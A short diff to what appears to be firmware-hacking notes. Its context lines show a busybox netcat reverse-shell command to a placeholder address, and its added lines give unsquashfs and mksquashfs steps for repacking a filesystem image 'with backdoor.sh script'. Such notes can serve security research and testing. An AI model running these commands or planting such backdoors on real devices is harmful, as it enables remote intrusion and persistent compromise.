@@ -49,3 +49,17 @@
    ```sh
    ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
    ```
+
+## Make squashfs filesystem
+
+> Display filesystem superblock information
+
+```console
+~ unsquashfs -s <old-squashfs>
+```
+
+> Make squashfs with backdoor.sh script
+
+```console
+~ mksquashfs <unsquashed-filesystem> <new-squashfs> -comp <compression> -b <block size>
+```
